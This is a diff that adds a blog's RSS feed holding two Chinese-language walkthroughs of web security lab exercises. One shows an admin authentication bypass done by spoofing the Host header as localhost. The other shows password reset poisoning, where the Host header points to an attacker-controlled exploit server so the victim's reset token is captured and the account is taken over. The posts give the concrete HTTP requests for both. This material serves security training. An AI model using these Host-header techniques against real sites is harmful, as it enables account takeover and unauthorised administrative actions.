@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Host-Header-Attack on en1r0py</title><link>/tags/host-header-attack/</link><description>Recent content in Host-Header-Attack on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 22 Dec 2024 23:01:39 +0800</lastBuildDate><atom:link href="/tags/host-header-attack/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Host header authentication bypass</title><link>/posts/2024/host-header-attack-lab-lab-host-header-authentication-bypass/</link><pubDate>Sun, 22 Dec 2024 23:01:39 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-lab-host-header-authentication-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>访问&lt;code>/admin&lt;/code>
+&lt;img alt="Admin" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-2.jpg">&lt;/li>
+&lt;li>根据题目提示&lt;code>基于 HTTP Host 头对用户的权限级别进行假设&lt;/code>，修改步骤1请求&lt;code>Host&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">localhost&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;section&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;h1&amp;gt;Users&amp;lt;/h1&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;wiener - &amp;lt;/span&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=wiener&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/section&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改url并发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">localhost&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Basic password reset poisoning</title><link>/posts/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning/</link><pubDate>Sun, 22 Dec 2024 22:06:09 +0800</pubDate><guid>/posts/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击&lt;code>My account&lt;/code>并点击&lt;code>Forgot password?&lt;/code>，并输入&lt;code>wiener&lt;/code>，对应请求如下
+&lt;img alt="Login" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-2.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a16009403d415b6d5e881ad008a004c.web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=nYHLZecComsDUANkqK08uANGbcCZYk6X&amp;amp;username=wiener
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Email client&lt;/code>，重置的链接如下
+&lt;img alt="Email client" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-3.jpg">&lt;/li>
+&lt;li>回到主页再次点击&lt;code>My account&lt;/code>、&lt;code>Forgot password?&lt;/code>，并使用Burp Intercept拦截请求后发送到Burp Repeater，并修改&lt;code>Host&lt;/code>为&lt;code>exploit-server&lt;/code>后发送
+&lt;img alt="Login" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-4.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">exploit-0ad000c8038915a8d5c5801601700056.exploit-server.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=gzFCxNImVsCRkkDFSz0WzmSIjVO79eyc&amp;amp;username=carlos
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Access log&lt;/code>
+&lt;img alt="Access log" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-5.jpg">&lt;/li>
+&lt;li>访问&lt;code>/forgot-password?temp-forgot-password-token=5m63f7q3b6e7sh9s1bd6tb3hksjl8a7v&lt;/code>
+&lt;img alt="Password reset" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-6.jpg">&lt;/li>
+&lt;li>使用&lt;code>carlos&lt;/code>与修改后的密码登录即可解题&lt;/li>
+&lt;/ol></content></item></channel></rss>
